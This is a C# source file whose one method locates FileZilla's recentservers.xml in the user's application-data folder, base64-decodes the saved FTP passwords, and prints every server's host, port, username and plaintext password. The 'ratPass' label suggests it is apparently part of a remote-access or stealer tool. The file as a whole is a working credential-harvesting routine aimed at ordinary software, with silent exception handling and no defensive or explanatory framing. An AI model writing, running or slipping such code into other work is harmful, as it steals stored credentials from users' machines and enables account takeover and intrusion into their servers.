using System;
using System.IO;
using System.Text;
using System.Xml;


    internal class fileZilla
    {
        public void FileZillaCrypt()
        {
            string text = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "FileZilla\\recentservers.xml");
            try
            {
                if (!File.Exists(text))
                {
                    Console.WriteLine("[-] FileZilla Not Found");
                    return;
                }
                try
                {
                    XmlDocument xmlDocument = new XmlDocument();
                    xmlDocument.Load(text);
                    Console.WriteLine("{0,-20}{1,-8}{2,-15}{3,-15}", "Host", "Port", "Username", "ratPass");
                    foreach (XmlElement item in ((XmlElement)xmlDocument.GetElementsByTagName("RecentServers")[0]).GetElementsByTagName("Server"))
                    {
                        string innerText = item.GetElementsByTagName("Host")[0].InnerText;
                        string innerText2 = item.GetElementsByTagName("Port")[0].InnerText;
                        string innerText3 = item.GetElementsByTagName("User")[0].InnerText;
                        string @string = Encoding.UTF8.GetString(Convert.FromBase64String(item.GetElementsByTagName("Pass")[0].InnerText));
                        if (!string.IsNullOrEmpty(innerText) && !string.IsNullOrEmpty(innerText2) && !string.IsNullOrEmpty(innerText3) && !string.IsNullOrEmpty(@string))
                        {
                            Console.WriteLine("{0,-20}{1,-8}{2,-15}{3,-15}", innerText, innerText2, innerText3, @string);
                            continue;
                        }
                        break;
                    }
                }
                catch
                {
                }
            }
            catch
            {
            }
        }
    }
